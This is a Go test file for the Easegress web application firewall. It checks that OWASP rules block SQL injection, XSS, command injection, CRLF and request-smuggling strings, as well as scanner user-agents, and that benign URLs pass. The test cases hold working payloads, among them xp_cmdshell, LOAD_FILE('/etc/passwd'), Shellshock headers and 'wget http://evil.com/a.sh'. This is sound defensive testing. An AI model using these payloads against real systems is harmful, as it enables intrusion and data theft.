//go:build !windows

/*
 * Copyright (c) 2017, The Easegress Authors
 * All rights reserved.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package wafcontroller

import (
	"bytes"
	"fmt"
	"mime/multipart"
	"net/http"
	"net/textproto"
	"strings"
	"testing"

	"github.com/megaease/easegress/v2/pkg/context"
	"github.com/megaease/easegress/v2/pkg/object/wafcontroller/protocol"
	"github.com/megaease/easegress/v2/pkg/protocols/httpprot"
	"github.com/stretchr/testify/assert"
)

func setRequest(t *testing.T, ctx *context.Context, ns string, req *http.Request) {
	httpreq, err := httpprot.NewRequest(req)
	assert.Nil(t, err)
	err = httpreq.FetchPayload(1024 * 1024)
	assert.Nil(t, err)
	ctx.SetRequest(ns, httpreq)
	ctx.UseNamespace(ns)
}

func TestSQLInjectionRules(t *testing.T) {
	assert := assert.New(t)

	type sqlInjectionTestCase struct {
		Name        string
		Method      string
		URL         string
		Headers     map[string]string
		Cookies     map[string]string
		RuleID      string
		Description string
	}

	var testCases = []sqlInjectionTestCase{
		// Rule 942100 - libinjection detection
		{
			Name:        "942100_basic_sqli",
			Method:      "GET",
			URL:         "/test?id=1' OR '1'='1",
			RuleID:      "942100",
			Description: "Basic SQL injection using libinjection",
		},
		{
			Name:        "942100_union_select",
			Method:      "GET",
			URL:         "/test?search=test' UNION SELECT username,password FROM users--",
			RuleID:      "942100",
			Description: "UNION SELECT injection",
		},

		// Rule 942140 - Database names
		{
			Name:        "942140_information_schema",
			Method:      "GET",
			URL:         "/test?query=SELECT * FROM information_schema.tables",
			RuleID:      "942140",
			Description: "Information schema access",
		},
		{
			Name:        "942140_pg_catalog",
			Method:      "GET",
			URL:         "/test?meta=pg_catalog.pg_tables",
			RuleID:      "942140",
			Description: "PostgreSQL catalog access",
		},

		// Rule 942151 - SQL function names
		{
			Name:        "942151_concat_function",
			Method:      "GET",
			URL:         "/test?data=concat(user(),database())",
			RuleID:      "942151",
			Description: "SQL CONCAT function",
		},
		{
			Name:        "942151_substring_function",
			Method:      "GET",
			URL:         "/test?extract=substring(password,1,1)",
			RuleID:      "942151",
			Description: "SQL SUBSTRING function",
		},

		// Rule 942160 - Sleep/Benchmark functions
		{
			Name:        "942160_sleep_function",
			Method:      "GET",
			URL:         "/test?delay=sleep(5)",
			RuleID:      "942160",
			Description: "SQL SLEEP function for time-based injection",
		},
		{
			Name:        "942160_benchmark_function",
			Method:      "GET",
			URL:         "/test?test=benchmark(1000000,md5(1))",
			RuleID:      "942160",
			Description: "SQL BENCHMARK function",
		},

		// Rule 942170 - Conditional sleep/benchmark
		{
			Name:        "942170_conditional_sleep",
			Method:      "GET",
			URL:         "/test?check=SELECT IF(1=1,sleep(5),0)",
			RuleID:      "942170",
			Description: "Conditional sleep injection",
		},
		{
			Name:        "942170_select_benchmark",
			Method:      "GET",
			URL:         "/test?time=; SELECT benchmark(1000000,sha1(1))",
			RuleID:      "942170",
			Description: "SELECT with benchmark",
		},

		// Rule 942190 - MSSQL code execution
		{
			Name:        "942190_mssql_exec",
			Method:      "GET",
			URL:         "/test?cmd=' exec master..xp_cmdshell 'dir'--",
			RuleID:      "942190",
			Description: "MSSQL command execution",
		},
		{
			Name:        "942190_union_select_user",
			Method:      "GET",
			URL:         "/test?info=' UNION SELECT user()--",
			RuleID:      "942190",
			Description: "UNION SELECT user function",
		},

		// Rule 942220 - Integer overflow
		{
			Name:        "942220_integer_overflow",
			Method:      "GET",
			URL:         "/test?num=2147483648",
			RuleID:      "942220",
			Description: "Integer overflow value",
		},
		{
			Name:        "942220_magic_number",
			Method:      "GET",
			URL:         "/test?crash=2.2250738585072011e-308",
			RuleID:      "942220",
			Description: "Magic number crash",
		},

		// Rule 942230 - Conditional SQL injection
		{
			Name:        "942230_case_when",
			Method:      "GET",
			URL:         "/test?logic=(CASE WHEN 1=1 THEN 'true' ELSE 'false' END)",
			RuleID:      "942230",
			Description: "CASE WHEN conditional",
		},
		{
			Name:        "942230_if_condition",
			Method:      "GET",
			URL:         "/test?test=IF(1=1,'yes','no')",
			RuleID:      "942230",
			Description: "IF condition",
		},

		// Rule 942240 - MySQL charset and MSSQL DoS
		{
			Name:        "942240_alter_charset",
			Method:      "GET",
			URL:         "/test?set=ALTER TABLE users CHARACTER SET utf8",
			RuleID:      "942240",
			Description: "ALTER charset command",
		},
		{
			Name:        "942240_waitfor_delay",
			Method:      "GET",
			URL:         "/test?delay='; WAITFOR DELAY '00:00:05'--",
			RuleID:      "942240",
			Description: "MSSQL WAITFOR DELAY",
		},

		// Rule 942250 - MATCH AGAINST, MERGE, EXECUTE IMMEDIATE
		{
			Name:        "942250_match_against",
			Method:      "GET",
			URL:         "/test?search=MATCH(title,content) AGAINST('test')",
			RuleID:      "942250",
			Description: "MATCH AGAINST fulltext search",
		},
		{
			Name:        "942250_execute_immediate",
			Method:      "GET",
			URL:         "/test?exec=EXECUTE IMMEDIATE 'SELECT * FROM users'",
			RuleID:      "942250",
			Description: "EXECUTE IMMEDIATE command",
		},

		// Rule 942270 - Basic UNION SELECT
		{
			Name:        "942270_union_select_from",
			Method:      "GET",
			URL:         "/test?id=1 UNION SELECT username FROM users",
			RuleID:      "942270",
			Description: "Basic UNION SELECT FROM",
		},

		// Rule 942280 - pg_sleep and shutdown
		{
			Name:        "942280_pg_sleep",
			Method:      "GET",
			URL:         "/test?wait=SELECT pg_sleep(5)",
			RuleID:      "942280",
			Description: "PostgreSQL pg_sleep function",
		},
		{
			Name:        "942280_shutdown",
			Method:      "GET",
			URL:         "/test?cmd=; SHUTDOWN --",
			RuleID:      "942280",
			Description: "Database shutdown command",
		},

		// Rule 942290 - MongoDB injection
		{
			Name:        "942290_mongodb_where",
			Method:      "GET",
			URL:         "/test?filter=$where:function(){return true}",
			RuleID:      "942290",
			Description: "MongoDB $where injection",
		},

		// Rule 942320 - Stored procedures
		{
			Name:        "942320_create_procedure",
			Method:      "GET",
			URL:         "/test?sql=CREATE PROCEDURE test() - comment",
			RuleID:      "942320",
			Description: "CREATE PROCEDURE command",
		},

		// Rule 942350 - UDF and data manipulation
		{
			Name:        "942350_create_function",
			Method:      "GET",
			URL:         "/test?udf=CREATE FUNCTION test() RETURNS STRING",
			RuleID:      "942350",
			Description: "CREATE FUNCTION for UDF",
		},
		{
			Name:        "942350_alter_table",
			Method:      "GET",
			URL:         "/test?ddl=; ALTER TABLE users DROP COLUMN password",
			RuleID:      "942350",
			Description: "ALTER TABLE command",
		},

		// Rule 942360 - Concatenated SQL injection
		{
			Name:        "942360_load_file",
			Method:      "GET",
			URL:         "/test?file=LOAD_FILE('/etc/passwd')",
			RuleID:      "942360",
			Description: "LOAD_FILE function",
		},
		{
			Name:        "942360_select_into_outfile",
			Method:      "GET",
			URL:         "/test?export=SELECT * FROM users INTO OUTFILE '/tmp/dump'",
			RuleID:      "942360",
			Description: "SELECT INTO OUTFILE",
		},

		// Rule 942500 - MySQL inline comments
		{
			Name:        "942500_mysql_comment",
			Method:      "GET",
			URL:         "/test?bypass=/*! SELECT */ * FROM users",
			RuleID:      "942500",
			Description: "MySQL inline comment bypass",
		},
		{
			Name:        "942500_version_comment",
			Method:      "GET",
			URL:         "/test?ver=/*!50000 SELECT version() */",
			RuleID:      "942500",
			Description: "MySQL version-specific comment",
		},

		// Rule 942540 - Authentication bypass
		{
			Name:        "942540_quote_bypass",
			Method:      "GET",
			URL:         "/test?user=admin';",
			RuleID:      "942540",
			Description: "Quote-based authentication bypass",
		},

		// Rule 942550 - JSON-based SQL injection
		{
			Name:        "942550_json_extract",
			Method:      "GET",
			URL:         "/test?json=JSON_EXTRACT(data,'$.password')",
			RuleID:      "942550",
			Description: "JSON_EXTRACT function",
		},

		// Header-based injections
		{
			Name:   "942100_user_agent_sqli",
			Method: "GET",
			URL:    "/test",
			Headers: map[string]string{
				"User-Agent": "Mozilla/5.0' OR 1=1--",
			},
			RuleID:      "942100",
			Description: "SQL injection in User-Agent header",
		},
		{
			Name:   "942100_referer_sqli",
			Method: "GET",
			URL:    "/test",
			Headers: map[string]string{
				"Referer": "http://evil.com' UNION SELECT password FROM users--",
			},
			RuleID:      "942100",
			Description: "SQL injection in Referer header",
		},

		// Cookie-based injections
		{
			Name:   "942100_cookie_sqli",
			Method: "GET",
			URL:    "/test",
			Cookies: map[string]string{
				"sessionid": "abc123' OR 1=1--",
			},
			RuleID:      "942100",
			Description: "SQL injection in cookie value",
		},
		{
			Name:   "942140_cookie_db_name",
			Method: "GET",
			URL:    "/test",
			Cookies: map[string]string{
				"dbinfo": "information_schema.columns",
			},
			RuleID:      "942140",
			Description: "Database name in cookie",
		},
	}

	customRules := protocol.CustomsSpec(crsSetupConf)

	owaspRules := protocol.OwaspRulesSpec{
		"REQUEST-901-INITIALIZATION.conf",
		"REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
		"REQUEST-949-BLOCKING-EVALUATION.conf",
	}
	spec := &protocol.RuleGroupSpec{
		Name: "testGroup",
		Rules: protocol.RuleSpec{
			OwaspRules: &owaspRules,
			Customs:    &customRules,
		},
	}
	ruleGroup, err := newRuleGroup(spec)
	assert.Nil(err, "Failed to create rule group")
	ctx := context.New(nil)

	for _, tc := range testCases {
		fmt.Println("Testing case:", tc.Name)
		req, err := http.NewRequest(tc.Method, "http://127.0.0.1:8080"+tc.URL, nil)
		assert.Nil(err, "Failed to create request", tc)

		for key, value := range tc.Headers {
			req.Header.Set(key, value)
		}

		for name, value := range tc.Cookies {
			req.AddCookie(&http.Cookie{Name: name, Value: value})
		}
		setRequest(t, ctx, tc.Name, req)
		result := ruleGroup.Handle(ctx)
		assert.NotNil(result.Interruption)
		assert.Equal(http.StatusForbidden, result.Interruption.Status)
		assert.Equal(protocol.ResultBlocked, result.Result)
	}

	allowedUrls := []string{
		"/test?id=123",
		"/test?id=hello",
		"/test?id=alice&foo=bar",
		"/test?id=2025-08-07",
		"/test?user=alice&search=book",
		"/test?category=electronics&page=2",
		"/test?email=alice@example.com",
		"/test?price=19.99",
		"/test?name=张三",
		"/test?comment=nice+post",
	}
	for _, u := range allowedUrls {
		req, err := http.NewRequest(http.MethodGet, "http://127.0.0.1:8080"+u, nil)
		assert.Nil(err)
		setRequest(t, ctx, u, req)
		result := ruleGroup.Handle(ctx)
		assert.Equal(protocol.ResultOk, result.Result)
	}
}

func TestXssAttackRules(t *testing.T) {
	assert := assert.New(t)

	type xssAttackTestCase struct {
		Name        string
		Method      string
		URL         string
		Headers     map[string]string
		Cookies     map[string]string
		RuleID      string
		Description string
	}

	var xssAttackTestCases = []xssAttackTestCase{
		{
			Name:        "941100_libinjection_script",
			Method:      "GET",
			URL:         "/test?input=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
			RuleID:      "941100",
			Description: "libinjection detects basic script XSS attack",
		},
		{
			Name:        "941110_script_tag",
			Method:      "GET",
			URL:         "/test?msg=<script>alert('XSS')</script>",
			RuleID:      "941110",
			Description: "Direct <script> tag injection",
		},
		{
			Name:        "941120_img_onerror_event",
			Method:      "GET",
			URL:         "/test?avatar=<img src=x onerror=alert(1)>",
			RuleID:      "941120",
			Description: "Event handler XSS vector (onerror)",
		},
		{
			Name:        "941130_data_attribute_injection",
			Method:      "GET",
			URL:         "/test?download=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
			RuleID:      "941130",
			Description: "data:text/html;base64 attribute injection",
		},
		{
			Name:        "941140_css_javascript_uri",
			Method:      "GET",
			URL:         "/test?style=background:url(javascript:alert(1))",
			RuleID:      "941140",
			Description: "CSS property with url(javascript:...)",
		},
		{
			Name:        "941160_html_injection_iframe",
			Method:      "GET",
			URL:         `/test?payload=<iframe src="javascript:alert(1)"></iframe>`,
			RuleID:      "941160",
			Description: "HTML injection: iframe with javascript: URI",
		},
		{
			Name:        "941170_javascript_href",
			Method:      "GET",
			URL:         "/test?url=javascript:alert(1)",
			RuleID:      "941170",
			Description: "Attribute value containing javascript:",
		},
		{
			Name:        "941180_document_cookie_keyword",
			Method:      "GET",
			URL:         "/test?js=document.cookie",
			RuleID:      "941180",
			Description: "Sensitive JS keyword: document.cookie",
		},
		{
			Name:        "941190_style_import",
			Method:      "GET",
			URL:         `/test?css=<style>@import 'javascript:alert(1)';</style>`,
			RuleID:      "941190",
			Description: "style tag with @import",
		},
		{
			Name:        "941230_embed_tag",
			Method:      "GET",
			URL:         `/test?payload=<EMBED src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">`,
			RuleID:      "941230",
			Description: "<EMBED> tag injection",
		},
		{
			Name:        "941240_import_implementation",
			Method:      "GET",
			URL:         `/test?xml=<?import implementation="javascript:alert(1)">`,
			RuleID:      "941240",
			Description: "XML import implementation attribute",
		},
		{
			Name:        "941250_meta_http_equiv",
			Method:      "GET",
			URL:         `/test?html=<meta http-equiv="refresh" content="0;url=javascript:alert(1)">`,
			RuleID:      "941250",
			Description: "META http-equiv attribute injection",
		},
		{
			Name:        "941260_meta_charset",
			Method:      "GET",
			URL:         `/test?html=<meta charset="utf-7">`,
			RuleID:      "941260",
			Description: "META charset attribute injection",
		},
		{
			Name:        "941320_html_tag_img",
			Method:      "GET",
			URL:         "/test?img=<img src=x onerror=alert(1)>",
			RuleID:      "941320",
			Description: "HTML tag injection (img)",
		},
		{
			Name:        "941330_location_assignment",
			Method:      "GET",
			URL:         "/test?js=\"location=alert(1)\"",
			RuleID:      "941330",
			Description: "Assignment to sensitive JS property: location",
		},
		{
			Name:        "941340_dot_assignment",
			Method:      "GET",
			URL:         "/test?js=\"x.y=alert(1)\"",
			RuleID:      "941340",
			Description: "Assignment to object property via dot notation",
		},
		{
			Name:        "941350_utf7_encoding",
			Method:      "GET",
			URL:         "/test?payload=+ADw-script+AD4-alert('XSS');+ADw-/script+AD4-",
			RuleID:      "941350",
			Description: "UTF-7 encoded XSS",
		},
		{
			Name:        "941360_jsfuck_payload",
			Method:      "GET",
			URL:         "/test?payload=![]+[]['filter']['constructor']('alert(1)')()",
			RuleID:      "941360",
			Description: "JSFuck obfuscated XSS",
		},
		{
			Name:        "941370_global_var_bracket",
			Method:      "GET",
			URL:         "/test?payload=self[/*XSS*/]",
			RuleID:      "941370",
			Description: "Global JS variable using bracket notation",
		},
		{
			Name:        "941390_eval_function",
			Method:      "GET",
			URL:         "/test?js=eval(alert(1))",
			RuleID:      "941390",
			Description: "eval() JavaScript function",
		},
		{
			Name:        "941400_function_chain",
			Method:      "GET",
			URL:         "/test?js=[].map.call`alert(1)`",
			RuleID:      "941400",
			Description: "Function chaining with call and template string",
		},
	}

	customRules := protocol.CustomsSpec(crsSetupConf)

	owaspRules := protocol.OwaspRulesSpec{
		"REQUEST-901-INITIALIZATION.conf",
		"REQUEST-941-APPLICATION-ATTACK-XSS.conf",
		"REQUEST-949-BLOCKING-EVALUATION.conf",
	}
	spec := &protocol.RuleGroupSpec{
		Name: "testGroup",
		Rules: protocol.RuleSpec{
			OwaspRules: &owaspRules,
			Customs:    &customRules,
		},
	}
	ruleGroup, err := newRuleGroup(spec)
	assert.Nil(err, "Failed to create rule group")
	ctx := context.New(nil)

	for _, tc := range xssAttackTestCases {
		fmt.Println("Testing case:", tc.Name)
		req, err := http.NewRequest(tc.Method, "http://127.0.0.1:8080"+tc.URL, nil)
		assert.Nil(err, "Failed to create request", tc)

		for key, value := range tc.Headers {
			req.Header.Set(key, value)
		}

		for name, value := range tc.Cookies {
			req.AddCookie(&http.Cookie{Name: name, Value: value})
		}
		setRequest(t, ctx, tc.Name, req)
		result := ruleGroup.Handle(ctx)
		assert.NotNil(result.Interruption)
		assert.Equal(http.StatusForbidden, result.Interruption.Status)
		assert.Equal(protocol.ResultBlocked, result.Result)
	}

	allowedUrls := []string{
		"/test?id=123",
		"/test?id=hello",
		"/test?id=alice&foo=bar",
		"/test?id=2025-08-07",
		"/test?user=alice&search=book",
		"/test?category=electronics&page=2",
		"/test?email=alice@example.com",
		"/test?price=19.99",
		"/test?name=张三",
		"/test?comment=nice+post",
	}
	for _, u := range allowedUrls {
		req, err := http.NewRequest(http.MethodGet, "http://127.0.0.1:8080"+u, nil)
		assert.Nil(err)
		setRequest(t, ctx, u, req)
		result := ruleGroup.Handle(ctx)
		assert.Equal(protocol.ResultOk, result.Result)
	}
}

func TestRCEAttackRules(t *testing.T) {
	// Test for remote code execution (RCE) attacks
	assert := assert.New(t)

	type rceAttackTestCase struct {
		Name        string
		Method      string
		URL         string
		Headers     map[string]string
		Cookies     map[string]string
		RuleID      string
		Description string
		Body        string
	}

	var rceAttackTestCases = []rceAttackTestCase{
		{
			Name:        "932230_basic_unix_command",
			Method:      "GET",
			URL:         "/vuln?cmd=ls",
			RuleID:      "932230",
			Description: "Basic Unix command injection: ls",
		},
		{
			Name:        "932230_command_concat",
			Method:      "GET",
			URL:         "/vuln?cmd=cat /etc/passwd;id",
			RuleID:      "932230",
			Description: "Command concatenation with semicolon",
		},
		{
			Name:        "932130_unix_shell_expression",
			Method:      "GET",
			URL:         "/vuln?cmd=$(whoami)",
			RuleID:      "932130",
			Description: "Shell expression injection: $(whoami)",
		},
		{
			Name:        "932220_pipe_injection",
			Method:      "GET",
			URL:         "/vuln?cmd=cat /etc/passwd | grep root",
			RuleID:      "932220",
			Description: "Unix pipe injection",
		},
		{
			Name:        "932280_brace_expansion",
			Method:      "GET",
			URL:         "/vuln?cmd=echo {1,2,3}",
			RuleID:      "932280",
			Description: "Brace expansion in Unix shell",
		},
		{
			Name:        "932330_shell_history_invocation",
			Method:      "GET",
			URL:         "/vuln?cmd=!-1",
			RuleID:      "932330",
			Description: "Unix shell history invocation",
		},
		{
			Name:        "932160_unix_shell_keyword",
			Method:      "GET",
			URL:         "/vuln?cmd=wget http://evil.com/a.sh",
			RuleID:      "932160",
			Description: "Unix shell code found (wget)",
		},
		{
			Name:        "932120_powershell_command",
			Method:      "GET",
			URL:         "/vuln?cmd=powershell -Command \"Get-ChildItem\"",
			RuleID:      "932120",
			Description: "Windows PowerShell command injection",
		},
		{
			Name:        "932140_windows_batch_for",
			Method:      "GET",
			URL:         "/vuln?cmd=for /f %i in ('dir') do @echo %i",
			RuleID:      "932140",
			Description: "Windows batch 'for' command injection",
		},
		{
			Name:        "932170_shellshock_header",
			Method:      "GET",
			URL:         "/vuln",
			Headers:     map[string]string{"User-Agent": "() { :; }; /bin/bash -c 'id'"},
			RuleID:      "932170",
			Description: "Shellshock attack via User-Agent header",
		},
		{
			Name:        "932171_shellshock_arg",
			Method:      "GET",
			URL:         "/vuln?foo=() { :; }; echo shellshock",
			RuleID:      "932171",
			Description: "Shellshock via argument",
		},
		{
			Name:        "932200_rce_bypass_tick",
			Method:      "GET",
			URL:         "/vuln?cmd=`whoami`",
			RuleID:      "932200",
			Description: "Evasion technique using backticks",
		},
		{
			Name:        "932240_unix_injection_evasion",
			Method:      "GET",
			URL:         "/vuln?cmd=ls%20%24(awk%20'BEGIN{system(\"id\")}'%20)",
			RuleID:      "932240",
			Description: "Unix command injection evasion attempt",
		},
	}

	customRules := protocol.CustomsSpec(crsSetupConf)

	owaspRules := protocol.OwaspRulesSpec{
		"REQUEST-901-INITIALIZATION.conf",
		"REQUEST-932-APPLICATION-ATTACK-RCE.conf",
		"REQUEST-949-BLOCKING-EVALUATION.conf",
	}
	spec := &protocol.RuleGroupSpec{
		Name: "testGroup",
		Rules: protocol.RuleSpec{
			OwaspRules: &owaspRules,
			Customs:    &customRules,
		},
	}
	ruleGroup, err := newRuleGroup(spec)
	assert.Nil(err, "Failed to create rule group")
	ctx := context.New(nil)

	for _, tc := range rceAttackTestCases {
		fmt.Println("Testing case:", tc.Name)
		var req *http.Request
		var err error
		if tc.Body == "" {
			req, err = http.NewRequest(tc.Method, "http://127.0.0.1:8080"+tc.URL, nil)
		} else {
			req, err = http.NewRequest(tc.Method, "http://127.0.0.1:8080"+tc.URL, strings.NewReader(tc.Body))
		}
		assert.Nil(err, "Failed to create request", tc)

		for key, value := range tc.Headers {
			req.Header.Set(key, value)
		}

		for name, value := range tc.Cookies {
			req.AddCookie(&http.Cookie{Name: name, Value: value})
		}
		setRequest(t, ctx, tc.Name, req)
		result := ruleGroup.Handle(ctx)
		assert.NotNil(result.Interruption)
		assert.Equal(http.StatusForbidden, result.Interruption.Status)
		assert.Equal(protocol.ResultBlocked, result.Result)
	}

	allowedUrls := []string{
		"/test?id=123",
		"/test?id=hello",
		"/test?id=alice&foo=bar",
		"/test?id=2025-08-07",
		"/test?user=alice&search=book",
		"/test?category=electronics&page=2",
		"/test?email=alice@example.com",
		"/test?price=19.99",
		"/test?name=张三",
		"/test?comment=nice+post",
	}
	for _, u := range allowedUrls {
		req, err := http.NewRequest(http.MethodGet, "http://127.0.0.1:8080"+u, nil)
		assert.Nil(err)
		setRequest(t, ctx, u, req)
		result := ruleGroup.Handle(ctx)
		assert.Equal(protocol.ResultOk, result.Result)
	}
}

func TestProtocolAttackRules(t *testing.T) {
	assert := assert.New(t)

	type protocolAttackTestCase struct {
		Name        string
		Method      string
		URL         string
		Headers     map[string]string
		Cookies     map[string]string
		RuleID      string
		Description string
		Body        string
	}

	var rceAttackTestCases = []protocolAttackTestCase{
		{
			Name:   "CRLF in Header Injection",
			Method: "GET",
			URL:    "/",
			Headers: map[string]string{
				"X-Injected": "evil\r\nSet-Cookie: injected=1",
			},
			Cookies:     map[string]string{},
			RuleID:      "921140",
			Description: "Header value contains CRLF, triggers HTTP Header Injection rule 921140",
			Body:        "",
		},
		{
			Name:        "CRLF in Query Parameter",
			Method:      "GET",
			URL:         "/?input=something%0d%0aSet-Cookie:%20evil=1",
			Headers:     map[string]string{},
			Cookies:     map[string]string{},
			RuleID:      "921150",
			Description: "Query parameter contains CRLF, triggers HTTP Header Injection rule 921150",
			Body:        "",
		},
		{
			Name:   "Dangerous Content-Type Header",
			Method: "POST",
			URL:    "/upload",
			Headers: map[string]string{
				"Content-Type": "text/html;application/json",
			},
			Cookies:     map[string]string{},
			RuleID:      "921421",
			Description: "Content-Type header contains dangerous mime type combination, triggers rule 921421",
			Body:        "",
		},
		{
			Name:   "Request Smuggling: Transfer-Encoding and Content-Length",
			Method: "POST",
			URL:    "/api/data",
			Headers: map[string]string{
				"Transfer-Encoding": "chunked",
				"Content-Length":    "10",
			},
			Cookies:     map[string]string{},
			RuleID:      "921110",
			Description: "Request contains both Transfer-Encoding and Content-Length headers. Typical request smuggling vector.",
			Body:        "0\r\n\r\n",
		},
	}

	customRules := protocol.CustomsSpec(crsSetupConf)

	owaspRules := protocol.OwaspRulesSpec{
		"REQUEST-901-INITIALIZATION.conf",
		"REQUEST-920-PROTOCOL-ENFORCEMENT.conf",
		"REQUEST-921-PROTOCOL-ATTACK.conf",
		"REQUEST-949-BLOCKING-EVALUATION.conf",
	}
	spec := &protocol.RuleGroupSpec{
		Name: "testGroup",
		Rules: protocol.RuleSpec{
			OwaspRules: &owaspRules,
			Customs:    &customRules,
		},
	}
	ruleGroup, err := newRuleGroup(spec)
	assert.Nil(err, "Failed to create rule group")
	ctx := context.New(nil)

	for _, tc := range rceAttackTestCases {
		fmt.Println("Testing case:", tc.Name)
		var req *http.Request
		var err error
		if tc.Body == "" {
			req, err = http.NewRequest(tc.Method, "http://127.0.0.1:8080"+tc.URL, nil)
		} else {
			req, err = http.NewRequest(tc.Method, "http://127.0.0.1:8080"+tc.URL, strings.NewReader(tc.Body))
		}
		assert.Nil(err, "Failed to create request", tc)

		for key, value := range tc.Headers {
			req.Header.Set(key, value)
		}

		for name, value := range tc.Cookies {
			req.AddCookie(&http.Cookie{Name: name, Value: value})
		}
		setRequest(t, ctx, tc.Name, req)
		result := ruleGroup.Handle(ctx)
		assert.NotNil(result.Interruption)
		assert.Equal(http.StatusForbidden, result.Interruption.Status)
		assert.Equal(protocol.ResultBlocked, result.Result)
	}

	allowedUrls := []string{
		"/test?id=123",
		"/test?id=hello",
		"/test?id=alice&foo=bar",
		"/test?id=2025-08-07",
		"/test?user=alice&search=book",
		"/test?category=electronics&page=2",
		"/test?email=alice@example.com",
		"/test?price=19.99",
		"/test?name=张三",
		"/test?comment=nice+post",
	}
	for _, u := range allowedUrls {
		req, err := http.NewRequest(http.MethodGet, "http://127.0.0.1:8080"+u, nil)
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
		req.Header.Set("Accept-Language", "en-US,en;q=0.5")
		req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; ExampleBot/1.0; +http://example.com/bot)")
		req.Header.Set("Referer", "http://127.0.0.1/")
		req.Header.Set("Connection", "keep-alive")
		req.Header.Set("Cache-Control", "max-age=0")
		req.Header.Set("Upgrade-Insecure-Requests", "1")
		req.Header.Set("Accept-Encoding", "gzip, deflate, br")
		req.Header.Set("DNT", "1")
		req.Header.Set("X-Requested-With", "XMLHttpRequest")
		assert.Nil(err)
		setRequest(t, ctx, u, req)
		result := ruleGroup.Handle(ctx)
		assert.Equal(protocol.ResultOk, result.Result)
	}
}

func TestBotDetectionRules(t *testing.T) {
	assert := assert.New(t)

	testCases := []struct {
		Name        string
		Method      string
		URL         string
		Headers     map[string]string
		Cookies     map[string]string
		RuleID      string
		Description string
		Body        string
	}{
		{
			Name:        "ScannerUserAgent_arachni",
			Method:      "GET",
			URL:         "/",
			Headers:     map[string]string{"User-Agent": "arachni"},
			Cookies:     nil,
			RuleID:      "913100",
			Description: "User-Agent contains 'arachni', should trigger scanner detection",
			Body:        "",
		},
		{
			Name:        "ScannerUserAgent_betabot",
			Method:      "GET",
			URL:         "/login",
			Headers:     map[string]string{"User-Agent": "betabot"},
			Cookies:     nil,
			RuleID:      "913100",
			Description: "User-Agent contains 'betabot', should trigger scanner detection",
			Body:        "",
		},
		{
			Name:        "ScannerUserAgent_commix",
			Method:      "POST",
			URL:         "/api/test",
			Headers:     map[string]string{"User-Agent": "Mozilla/5.0 commix"},
			Cookies:     nil,
			RuleID:      "913100",
			Description: "User-Agent contains 'commix', should trigger scanner detection",
			Body:        "{}",
		},
		{
			Name:        "ScannerUserAgent_sqlmap",
			Method:      "GET",
			URL:         "/products",
			Headers:     map[string]string{"User-Agent": "sqlmap/1.6.4#stable (http://sqlmap.org)"},
			Cookies:     nil,
			RuleID:      "913100",
			Description: "User-Agent contains 'sqlmap', should trigger scanner detection",
			Body:        "",
		},
		{
			Name:        "ScannerUserAgent_nikto",
			Method:      "GET",
			URL:         "/admin",
			Headers:     map[string]string{"User-Agent": "Nikto/2.1.6 (Evasions:None) (Test:000010)"},
			Cookies:     nil,
			RuleID:      "913100",
			Description: "User-Agent contains 'nikto', should trigger scanner detection",
			Body:        "",
		},
		{
			Name:        "ScannerUserAgent_nmap",
			Method:      "GET",
			URL:         "/test",
			Headers:     map[string]string{"User-Agent": "Mozilla/5.0 (compatible; Nmap Scripting Engine)"},
			Cookies:     nil,
			RuleID:      "913100",
			Description: "User-Agent contains 'nmap', should trigger scanner detection",
			Body:        "",
		},
		{
			Name:        "ScannerUserAgent_nuclei",
			Method:      "GET",
			URL:         "/healthz",
			Headers:     map[string]string{"User-Agent": "Nuclei - Vulnerability Scanner"},
			Cookies:     nil,
			RuleID:      "913100",
			Description: "User-Agent contains 'nuclei', should trigger scanner detection",
			Body:        "",
		},
		{
			Name:        "ScannerUserAgent_dirbuster",
			Method:      "GET",
			URL:         "/.git/",
			Headers:     map[string]string{"User-Agent": "dirbuster"},
			Cookies:     nil,
			RuleID:      "913100",
			Description: "User-Agent contains 'dirbuster', should trigger scanner detection",
			Body:        "",
		},
		{
			Name:        "ScannerUserAgent_w3af",
			Method:      "POST",
			URL:         "/api/v1/user",
			Headers:     map[string]string{"User-Agent": "w3af.org"},
			Cookies:     nil,
			RuleID:      "913100",
			Description: "User-Agent contains 'w3af.org', should trigger scanner detection",
			Body:        "{}",
		},
		{
			Name:        "ScannerUserAgent_wpscan",
			Method:      "GET",
			URL:         "/wordpress/wp-login.php",
			Headers:     map[string]string{"User-Agent": "WPScan v3.8.22"},
			Cookies:     nil,
			RuleID:      "913100",
			Description: "User-Agent contains 'wpscan', should trigger scanner detection",
			Body:        "",
		},
		{
			Name:        "ScannerUserAgent_zgrab",
			Method:      "GET",
			URL:         "/status",
			Headers:     map[string]string{"User-Agent": "zgrab/0.1"},
			Cookies:     nil,
			RuleID:      "913100",
			Description: "User-Agent contains 'zgrab', should trigger scanner detection",
			Body:        "",
		},
		{
			Name:        "ScannerUserAgent_masscan",
			Method:      "GET",
			URL:         "/",
			Headers:     map[string]string{"User-Agent": "masscan/1.0"},
			Cookies:     nil,
			RuleID:      "913100",
			Description: "User-Agent contains 'masscan', should trigger scanner detection",
			Body:        "",
		},
		{
			Name:        "ScannerUserAgent_whatweb",
			Method:      "GET",
			URL:         "/",
			Headers:     map[string]string{"User-Agent": "WhatWeb/0.5.5"},
			Cookies:     nil,
			RuleID:      "913100",
			Description: "User-Agent contains 'whatweb', should trigger scanner detection",
			Body:        "",
		},
	}

	customRules := protocol.CustomsSpec(crsSetupConf)

	owaspRules := protocol.OwaspRulesSpec{
		"REQUEST-901-INITIALIZATION.conf",
		"REQUEST-913-SCANNER-DETECTION.conf",
		"REQUEST-949-BLOCKING-EVALUATION.conf",
	}
	spec := &protocol.RuleGroupSpec{
		Name: "testGroup",
		Rules: protocol.RuleSpec{
			OwaspRules: &owaspRules,
			Customs:    &customRules,
		},
	}
